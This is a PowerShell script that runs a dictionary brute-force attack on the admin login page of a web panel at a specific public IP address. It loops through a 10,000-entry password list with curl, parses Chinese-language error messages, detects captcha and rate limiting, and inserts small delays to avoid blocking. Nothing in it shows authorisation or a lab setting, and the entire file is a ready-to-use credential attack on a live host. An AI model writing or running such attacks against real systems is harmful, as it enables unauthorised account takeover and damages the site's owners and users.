$dict = "D:\desk\ai测试系统\data\wordlists\passwords_top10k.txt"
$passwords = Get-Content $dict
$total = $passwords.Count
$target = "http://39.98.71.120/admin/login/index?redirect="
$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
$tmpFile = "$env:TEMP\brute_resp.html"

Write-Host "=== Admin Password Brute Force ==="
Write-Host "Target: $target"
Write-Host "Username: admin"
Write-Host "Dictionary: $total passwords"
Write-Host "Failure indicator: '密码错误' in response body"
Write-Host ""

$found = $false
$blocked = $false
$startTime = Get-Date

for ($i = 0; $i -lt $total; $i++) {
    $lineNum = $i + 1
    $pwd = $passwords[$i]
    if ([string]::IsNullOrWhiteSpace($pwd)) { continue }

    $data = "username=admin&password=$pwd"

    try {
        # Run curl, save body to temp file
        & curl.exe -sk -o "$tmpFile" -X POST "$target" -d "$data" -H "User-Agent: $ua" 2>$null

        # Read body
        $body = ""
        if (Test-Path $tmpFile) {
            $body = Get-Content $tmpFile -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
        }
        if ((-not $body) -or ($body.Length -lt 10)) {
            Write-Host "$lineNum $pwd ERROR_EMPTY_RESPONSE"
            continue
        }

        # Check for rate limiting / captcha / blocking
        if ($body -match "验证码|captcha|频率限制|频繁访问|blocked|too many|rate limit|429 Forbidden|403 Forbidden") {
            Write-Host "$lineNum $pwd BLOCKED"
            $snippet = $body.Substring(0, [Math]::Min(300, $body.Length))
            Write-Host "  Response: $snippet"
            $blocked = $true
            break
        }

        # Check for failure: "密码错误"
        if ($body -match "密码错误") {
            if ($lineNum % 200 -eq 0) {
                $elapsed = [Math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
                Write-Host "$lineNum/$total $pwd FAIL (${elapsed}s)"
            }
            continue
        }

        # NO "密码错误" found - investigate
        $reason = 'NO_PASSWORD_ERROR_KEYWORD'
        $snippet = $body.Substring(0, [Math]::Min(500, $body.Length))

        if ($body -match "用户名|账号不存在|用户不存在") {
            Write-Host "$lineNum $pwd FAIL_USER_NOT_FOUND"
            continue
        }

        if ($body -match "登录成功|欢迎|dashboard|后台管理|管理首页|window.location|location.href") {
            $reason = 'SUCCESS_INDICATORS_FOUND'
        }

        Write-Host ""
        Write-Host "$lineNum $pwd POSSIBLE_SUCCESS ($reason)"
        Write-Host "--- RESPONSE ---"
        Write-Host $snippet
        Write-Host "--- END ---"
        $found = $true
        break

    } catch {
        Write-Host "$lineNum $pwd EXCEPTION: $_"
    }

    # Small delay every 25 requests
    if (($lineNum % 25) -eq 0) {
        Start-Sleep -Milliseconds 50
    }
}

$elapsed = [Math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
Write-Host ""
Write-Host "============================================="

if ($found) {
    Write-Host "PASSWORD FOUND at line $lineNum : $pwd"
    Write-Host "Requests sent: $lineNum"
    Write-Host "Time elapsed: ${elapsed}s"
} elseif ($blocked) {
    Write-Host "STOPPED - blocking detected at line $lineNum"
    Write-Host "Requests sent: $lineNum"
    Write-Host "Time elapsed: ${elapsed}s"
} else {
    Write-Host "EXHAUSTED - not found in $total passwords"
    Write-Host "Time elapsed: ${elapsed}s"
}

# Cleanup
if (Test-Path $tmpFile) { Remove-Item $tmpFile -Force }
